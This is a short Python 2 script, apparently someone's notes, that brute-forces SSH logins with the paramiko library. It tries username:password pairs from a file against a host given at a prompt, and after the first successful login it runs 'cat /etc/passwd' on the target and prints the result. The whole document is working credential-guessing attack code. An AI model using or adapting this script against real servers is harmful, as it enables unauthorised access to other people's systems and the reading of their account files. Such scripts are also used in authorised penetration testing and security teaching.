#!/usr/bin/python


import paramiko
import sys


# function definition
def usage():
    print '#'*10
    print 'Usage: ./paramiko_sshBrute_notes.py [file-path]'
    print 'Example: ./paramiko_sshBrute_notes.py uname-pword.txt'
    print '#'*10

def main(host, file_path):
    ssh_instance = ssh_client_setup()
    bruteforce(ssh_instance, host, file_path)
    ssh_instance.close()

def ssh_client_setup():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("paramiko.log")

    return ssh

def bruteforce(ssh, host, filePath):
    # opening the file path for reading purpose
    fd = open(filePath, 'r')

    # assumming the user-pass file is of the form  username:password\n
    for line in fd.readlines():
        user_pass = line.strip().split(':')
        try: 
            print '[+] Trying to login using username: %s and password = %s' %(user_pass[0], user_pass[1])
            ssh.connect(host, username=user_pass[0], password=user_pass[1], banner_timeout=60, auth_timeout=60)

        except:         # sys.exc_info() returns a tuple about the exception, and element 1 is the value of it
            print '[-] %s while trying username: %s, and password: %s' %(sys.exc_info()[1], user_pass[0], user_pass[1])
    
        else:
            print '[+] Successfully logged in using username: %s, and password: %s' %(user_pass[0], user_pass[1])
            stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')      # the command could technically be an input from cmdline
                
            for line in stdout.readlines():
                print line.strip()
            break


# script execution
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)
    hostname_ip = raw_input('[+] Hostname/IP: ')
    main(hostname_ip, sys.argv[1])
    sys.exit(0)

